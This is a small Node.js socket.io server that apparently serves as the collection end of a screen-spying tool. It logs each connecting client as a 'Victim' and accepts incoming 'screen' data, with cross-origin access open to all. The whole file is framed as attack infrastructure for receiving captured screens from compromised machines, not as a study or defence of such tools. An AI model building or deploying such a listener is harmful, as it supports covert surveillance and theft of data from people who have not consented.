const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
  cors: { origin: "*" }
});

io.on('connection', (socket) => {
    console.log('Victim Connected');
    socket.on('screen', (data) => {
        console.log('Data Received');
    });
});

http.listen(process.env.PORT || 3000, () => {
    console.log('Server is running');
});
